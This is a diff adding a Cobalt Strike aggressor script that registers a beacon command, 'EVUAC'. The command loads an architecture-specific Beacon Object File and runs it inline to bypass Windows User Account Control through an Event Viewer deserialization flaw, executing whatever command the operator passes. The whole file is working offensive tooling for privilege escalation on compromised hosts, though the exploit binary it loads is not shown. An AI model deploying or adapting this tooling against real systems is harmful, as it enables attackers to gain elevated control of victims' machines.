@@ -1,0 +1,32 @@
+beacon_command_register(
+"EVUAC", 
+"Bypass UAC via Event Viewer deserialization vuln.", 
+"Usage: EVUAC Command (use quotes around entire commmand)");
+
+alias EVUAC {
+	local('$barch $handle $data $args');
+	if(size(@_) != 2)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("EVUAC"));
+		return;
+	}
+
+    # figure out the arch of this session
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("EventViewerUAC. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # pack our arguments
+    $args   = bof_pack($1, "z", $2);
+
+    # announce what we're doing
+    btask($1, "Running EventViewerUAC BOF");
+    
+    # execute it.
+    beacon_inline_execute($1, $data, "go", $args);
+
+}
